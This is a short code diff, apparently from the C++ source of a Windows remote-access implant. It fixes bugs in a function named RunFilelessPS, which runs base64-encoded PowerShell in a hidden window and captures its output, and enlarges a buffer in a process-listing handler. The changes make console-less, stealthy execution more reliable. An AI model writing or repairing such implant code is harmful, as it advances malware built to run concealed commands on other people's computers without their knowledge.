@@ -464,8 +464,8 @@ static std::wstring RunFilelessPS(const std::string& b64Command) {
     si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
     si.wShowWindow = SW_HIDE;
     si.hStdOutput = hWrite;
-    si.hStdError = hWrite;
-    si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
+    si.hStdError  = hWrite;
+    si.hStdInput  = nullptr; // no console in -mwindows build; NULL avoids INVALID_HANDLE crash
 
     PROCESS_INFORMATION pi = {};
     BOOL ok = CreateProcessW(nullptr, &cmdLine[0], nullptr, nullptr, TRUE,
@@ -672,7 +672,7 @@ static std::wstring HandlePs(const std::string& /*args*/) {
     out += L"-------- -------- ------------------------\n";
     if (Process32FirstW(snap, &pe)) {
         do {
-            wchar_t line[256];
+            wchar_t line[320]; // MAX_PATH(260) + pid fields + newline
             swprintf_s(line, L"%-8lu %-8lu %s\n",
                        pe.th32ProcessID, pe.th32ParentProcessID, pe.szExeFile);
             out += line;
